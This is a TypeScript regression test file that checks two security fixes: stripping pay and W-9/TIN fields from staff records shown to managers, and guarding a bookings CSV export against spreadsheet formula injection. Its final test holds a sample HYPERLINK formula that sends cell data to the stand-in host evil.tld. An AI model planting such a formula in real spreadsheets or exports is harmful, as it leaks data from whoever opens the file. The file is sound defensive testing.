// Security-hardening regression tests (pure). Two fixes:
//  1. redactStaffForViewer — the crew directory read is gated on crew:view (which
//     managers hold), but pay/tax fields are governed by pay:view:all / tax:view
//     (which managers do NOT). The projection strips those for non-privileged
//     viewers so /api/admin/staff can't leak comp + W-9/TIN to a manager.
//  2. csvCell — neutralizes spreadsheet formula injection in the bookings CSV export
//     (attacker-controlled name/email/promo flow into a staff-downloaded file).
import assert from 'node:assert/strict'
import test from 'node:test'

import { redactStaffForViewer, type Staff } from '../app/lib/staff'
import { csvCell } from '../app/lib/validators'
import { can } from '../app/lib/rbac'

const sample = (): Staff => ({
  id: 's1', name: 'Marcus Vela', phone: '555-0100', email: 'm@x.com', role: 'driver',
  active: true,
  payKind: 'driver', defaultPayCents: 5000, payByBusiness: { amazon: 6000 },
  payNotes: 'raise pending', payEffectiveDate: '2026-08-01', payActive: true,
  payHistory: [{ at: 1, defaultPayCents: 5000, active: true }],
  w9: { status: 'verified', tinLast4: '1234', addressComplete: true, collectedAt: 1 },
  createdAt: 1, updatedAt: 1,
})

// ── The RBAC facts the projection depends on (ties the fix to the real matrix) ──
test('manager holds the directory read gate but NOT pay/tax rights', () => {
  assert.equal(can('manager', 'crew:view'), true, 'manager reaches the crew directory')
  assert.equal(can('manager', 'pay:view:all'), false, 'manager must not see comp')
  assert.equal(can('manager', 'tax:view'), false, 'manager must not see W-9/TIN')
  assert.equal(can('admin', 'pay:view:all'), true)
  assert.equal(can('admin', 'tax:view'), true)
})

test('a non-privileged viewer (manager) gets pay + W-9 stripped, identity kept', () => {
  const view = redactStaffForViewer(sample(), { pay: false, tax: false })
  // Sensitive comp fields gone.
  assert.equal(view.defaultPayCents, undefined)
  assert.equal(view.payByBusiness, undefined)
  assert.equal(view.payHistory, undefined)
  assert.equal(view.payKind, undefined)
  assert.equal(view.payNotes, undefined)
  assert.equal(view.payEffectiveDate, undefined)
  assert.equal(view.payActive, undefined)
  // W-9 / TIN gone.
  assert.equal(view.w9, undefined)
  // Operational identity retained so the directory is still useful.
  assert.equal(view.name, 'Marcus Vela')
  assert.equal(view.phone, '555-0100')
  assert.equal(view.active, true)
})

test('a full-privilege viewer (admin) gets the record unchanged', () => {
  const s = sample()
  const view = redactStaffForViewer(s, { pay: true, tax: true })
  assert.equal(view.defaultPayCents, 5000)
  assert.deepEqual(view.payByBusiness, { amazon: 6000 })
  assert.deepEqual(view.w9, { status: 'verified', tinLast4: '1234', addressComplete: true, collectedAt: 1 })
})

test('pay-only viewer keeps comp but loses W-9, and vice versa', () => {
  const payOnly = redactStaffForViewer(sample(), { pay: true, tax: false })
  assert.equal(payOnly.defaultPayCents, 5000)
  assert.equal(payOnly.w9, undefined)
  const taxOnly = redactStaffForViewer(sample(), { pay: false, tax: true })
  assert.equal(taxOnly.defaultPayCents, undefined)
  assert.deepEqual(taxOnly.w9?.tinLast4, '1234')
})

test('redaction never mutates the source record', () => {
  const s = sample()
  redactStaffForViewer(s, { pay: false, tax: false })
  assert.equal(s.defaultPayCents, 5000, 'original still holds pay')
  assert.deepEqual(s.w9?.tinLast4, '1234', 'original still holds W-9')
})

// ── CSV formula injection ──────────────────────────────────────────────────────
test('csvCell prefixes formula/DDE triggers so they render as text', () => {
  assert.equal(csvCell('=1+1'), "'=1+1")
  assert.equal(csvCell('+15551234'), "'+15551234")
  assert.equal(csvCell('@SUM(A1)'), "'@SUM(A1)")
  assert.equal(csvCell('-2+3'), "'-2+3")            // leading '-' but NOT a number
  assert.equal(csvCell('\t=cmd'), "'\t=cmd")        // leading tab
})

test('csvCell leaves plain numbers (incl. negatives/decimals) untouched', () => {
  assert.equal(csvCell('-5.00'), '-5.00')
  assert.equal(csvCell('-5'), '-5')
  assert.equal(csvCell(1234), '1234')
  assert.equal(csvCell('0.00'), '0.00')
})

test('csvCell still RFC-4180 escapes delimiters and quotes', () => {
  assert.equal(csvCell('Doe, John'), '"Doe, John"')
  assert.equal(csvCell('a"b'), '"a""b"')
  assert.equal(csvCell('line1\nline2'), '"line1\nline2"')
  assert.equal(csvCell('John Doe'), 'John Doe')
  assert.equal(csvCell(undefined), '')
  assert.equal(csvCell(null), '')
})

test('a HYPERLINK exfil payload is both neutralized and quote-escaped', () => {
  const out = csvCell('=HYPERLINK("http://evil.tld/?d="&A1,"click")')
  assert.ok(out.startsWith('"\'='), `formula guard + quoting expected, got ${out}`)
  assert.ok(!out.startsWith('"=') && !out.startsWith('='), 'must not begin with a bare =')
})
